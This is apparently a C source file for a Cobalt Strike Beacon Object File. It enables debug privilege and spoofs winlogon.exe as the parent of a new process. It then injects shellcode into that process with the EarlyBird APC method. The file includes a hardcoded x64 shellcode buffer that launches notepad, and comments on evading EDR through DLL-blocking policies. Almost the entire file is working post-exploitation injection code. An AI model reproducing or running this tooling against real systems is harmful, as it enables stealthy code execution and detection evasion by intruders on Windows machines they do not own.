#include <windows.h>
#include "bofdefs.h"
#include "base.c"

void EnableDebugPriv( LPCSTR priv ) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;


	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] OpenProcessToken failed, Error = %d .\n" , KERNEL32$GetLastError() );
		return;
	}

	if (ADVAPI32$LookupPrivilegeValueA( NULL, priv, &luid ) == 0 )
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] LookupPrivilegeValue() failed, Error = %d .\n", KERNEL32$GetLastError() );
		KERNEL32$CloseHandle( hToken );
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if (!ADVAPI32$AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(tp), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL ))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] AdjustTokenPrivileges() failed, Error = %u\n", KERNEL32$GetLastError() );
		return;
	}

	KERNEL32$CloseHandle( hToken );
}

// code taken from: https://gist.github.com/G0ldenGunSec/8ca0e853dd5637af2881697f8de6aecc
int get_pid_of(char* target_process){
	HMODULE hMods[256];
	DWORD aProcesses[300];
	DWORD cbNeeded;
	DWORD procNeeded;
	DWORD numProcesses;

	KERNEL32$K32EnumProcesses(aProcesses, sizeof(aProcesses), &procNeeded);

	numProcesses = procNeeded / sizeof(DWORD);

	if (numProcesses == 300)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "WARNING: Process buffer filled, all running processes may not be enumerated");
	}

	for (int i = 0; i < numProcesses; i++)
	{
		HANDLE hProcess;
		hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
		if (hProcess > 0)
		{
			TCHAR processName[MAX_PATH];
            DWORD nameSize = sizeof(processName);
            if (KERNEL32$K32GetProcessImageFileNameA(hProcess, processName, nameSize))
            {
                // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", processName);
                if (MSVCRT$strstr(processName, target_process)){
                    KERNEL32$CloseHandle(hProcess);
                    return aProcesses[i];
                }
            }
			KERNEL32$CloseHandle(hProcess);
		}
	}
    return -1;
}

// code taken from: https://github.com/boku7/spawn
void SpawnProcess(char * peName, DWORD ppid, unsigned char * shellcode, SIZE_T shellcode_len){
    // Declare variables/struct
    // Declare booleans as WINBOOL in BOFs. "bool" will not work
    WINBOOL check1 = 0;
    WINBOOL check2 = 0;
    WINBOOL check3 = 0;
    WINBOOL check4 = 0;
    WINBOOL check5 = 0;
    // Pointer to the RE memory in the remote process we spawn. Returned from when we call WriteProcessMemory with a handle to the remote process
	void * remotePayloadAddr;
    //ULONG_PTR dwData = NULL;
    SIZE_T bytesWritten;
    // (07/20/21) - Changed from STARTUPINFOEX -> STARTUPINFOEXA
    STARTUPINFOEXA2 sInfoEx = { sizeof(sInfoEx) };
    intZeroMemory( &sInfoEx, sizeof(sInfoEx) );
    //   STARTUPINFOEXA - https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    //   STARTUPINFOA   - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    //   typedef struct _STARTUPINFOEXA {
    //     STARTUPINFOA                 StartupInfo;
    //     LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
    //   } STARTUPINFOEXA, *LPSTARTUPINFOEXA
    PROCESS_INFORMATION pInfo;
    intZeroMemory(&pInfo, sizeof(pInfo));
    SIZE_T cbAttributeListSize = 0;

    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;

    // Enable blocking of non-Microsoft signed DLL - This will not block EDR DLL's that are signed by Microsoft
    // "Nope, Falcon loads perfectly fine with 'blockdlls' enabled and hooks ntdll. umppcXXXX.dll (Falcon's injected DLL) is digitally signed by MS so no wonder this doesn't prevents EDR injection pic.twitter.com/lDT4gOuYSV"
    //   — reenz0h (@Sektor7Net) October 25, 2019
    // https://blog.xpnsec.com/protecting-your-malware/
    //DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2 + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2;
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;

    // Get a handle to the target process
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
    if (hProc != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened handle 0x%x to process %d(PID)", hProc, ppid);
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get handle to process: %d(PID)", ppid);
        return;
    }
    // Create an Attribute list. Make sure to have the second argument as 2 since we need to have 2 attributes in our lost
    // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
    // - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &cbAttributeListSize);
    // Allocate memry for our attribute list. We will supply a pointer to this struct to our STARTUPINFOEXA struct
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, cbAttributeListSize);
    // Initialise our list - This sets up our attribute list to hold the correct information to begin with
    KERNEL32$InitializeProcThreadAttributeList(pAttributeList, 2, 0, &cbAttributeListSize);

    // Here we call UpdateProcThreadAttribute twice to make sure our new process will spoof the PPID and start with CFG set to block non MS signed DLLs from loading
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribut
    // Spoof the parent process ID (PPID) using the handle to the process we got from the PID
    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2, &hProc, sizeof(HANDLE), NULL, NULL);
    // Set our new process to not load non-MS signed DLLs - AKA blockDll functional;ity in cobaltstrike
    //KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2, &policy, sizeof(policy), NULL, NULL);
    sInfoEx.lpAttributeList = pAttributeList;
	
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    WINBOOL check = KERNEL32$CreateProcessA(NULL, peName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&sInfoEx, &pInfo);
    if (check){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned process: %s | PID: %d | PPID: %d", peName,pInfo.dwProcessId,ppid);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not create a process for %s using CreateProcessA()",peName);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }

    // Allocate memory in the spawned process
    // We can write to PAGE_EXECUTE_READ memory in the remote process with WriteProcessMemory, so no need to allocate RW/RWE memory
    remotePayloadAddr = KERNEL32$VirtualAllocEx(pInfo.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (remotePayloadAddr != NULL){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated RE memory in remote process %d (PID) at: 0x%p", pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not allocate memory to remote process %d (PID)", pInfo.dwProcessId);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }
    // Write our popCalc shellcode payload to the remote process we spawned at the memory we allocated 
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    check3 = KERNEL32$WriteProcessMemory(pInfo.hProcess, remotePayloadAddr, (LPCVOID)shellcode, (SIZE_T)shellcode_len, (SIZE_T *) &bytesWritten);
    if (check3 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote %d bytes to memory in remote process %d (PID) at 0x%p", bytesWritten, pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not write payload to memory at 0x%p", remotePayloadAddr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }

    // This is the "EarlyBird" technique to hijack control of the processes main thread using APC
    // technique taught in Sektor7 course: RED TEAM Operator: Malware Development Intermediate Course
    // https://institute.sektor7.net/courses/rto-maldev-intermediate/463257-code-injection/1435343-earlybird
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
    // DWORD QueueUserAPC(
    //   PAPCFUNC  pfnAPC,   - A pointer to the payload we want to run
    //   HANDLE    hThread,  - A handle to the thread. Returned at PROCESS_INFORMATION.hThread after CreateProcessA call
    //   ULONG_PTR dwData    - Argument supplied to pfnAPC? Can be NULL
    // );
    check4 = KERNEL32$QueueUserAPC((PAPCFUNC)remotePayloadAddr, pInfo.hThread, (ULONG_PTR) NULL);
    if (check4 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] APC queued for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not queue APC for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }
    // When we resume the main thread from suspended, APC will trigger and our thread will execute our shellcode
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    check5 = KERNEL32$ResumeThread(pInfo.hThread);
    if (check5 != -1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Thread resumed and shellcode is being executed within the remote process!");
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not resume thread.");
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }

    // Cleanup the attribute list and close the handle to the parent process we spoofed
    KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
    KERNEL32$CloseHandle(hProc);	
}

void run(char * peName, unsigned char * shellcode, SIZE_T shellcode_len){
    // enable debug privilege to get the handles of protected process
    EnableDebugPriv(SE_DEBUG_NAME);
    
    // Get the pid of winlogon.exe
    DWORD ppid = get_pid_of("winlogon.exe");
    if (ppid == -1){
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get pid of target process");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Got pid of winlogon.exe: %d", ppid);

    // spawn process with ppid spoofed
    SpawnProcess(peName,ppid, shellcode,shellcode_len);
}

#ifdef BOF
void go(char * args, int len) {
    datap parser;
    char * peName;

	unsigned char * shellcode;
    SIZE_T shellcode_len; 

    BeaconDataParse(&parser, args, len);
    peName = BeaconDataExtract(&parser, NULL);
    shellcode_len = BeaconDataLength(&parser);
    shellcode = BeaconDataExtract(&parser, NULL);
    run(peName,shellcode,shellcode_len);
}

#else

int main()
{
    unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
"\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    run("explorer.exe", buf, sizeof(buf));
}

#endif